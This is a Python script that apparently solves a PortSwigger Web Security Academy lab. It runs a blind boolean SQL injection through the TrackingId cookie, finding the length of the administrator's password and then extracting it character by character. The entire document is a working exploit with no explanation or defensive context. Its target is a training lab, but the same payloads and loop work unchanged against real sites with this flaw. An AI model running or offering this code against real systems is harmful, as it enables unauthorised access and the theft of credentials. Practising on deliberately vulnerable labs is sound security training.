import requests

url = 'https://0afb00df03a30e7883652d8f005c0071.web-security-academy.net/filter?category=Lifestyle'
characters = '1234567890abcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=;:<>/?,.'

def get_length():
	for i in range(1,101):
		cookie = {'TrackingId':'hl8hkUxeGSMTJMAX','session':'P2lISj8ph2YHLL5g9dSKvGbluuCdEzpV'}
		payload = f"' And LENGTH((SELECT password from users where username='administrator')) = {i}--"
		cookie['TrackingId'] = cookie['TrackingId']+payload
		r = requests.get(url,cookies=cookie)
		if 'Welcome back!' in r.text:
			return i

def get_data(Length):
	temp = ""
	for i in range(1,length+1):
		for char in characters:
			cookie = {'TrackingId':'hl8hkUxeGSMTJMAX','session':'P2lISj8ph2YHLL5g9dSKvGbluuCdEzpV'}
			payload = f"' AND SUBSTRING((select password from users where username='administrator'), {i}, 1) = '{char}'--"
			cookie['TrackingId'] = cookie['TrackingId']+payload
			r = requests.get(url,cookies=cookie)
			if 'Welcome back!' in r.text:
				print('\r'+temp)
				temp += char
				break
	return temp


length = get_length()
print(f"Password Length {length}")
print("Dumping Data... Please be Patient.")
data = get_data(length)
print(f"Got it!:{data}") 
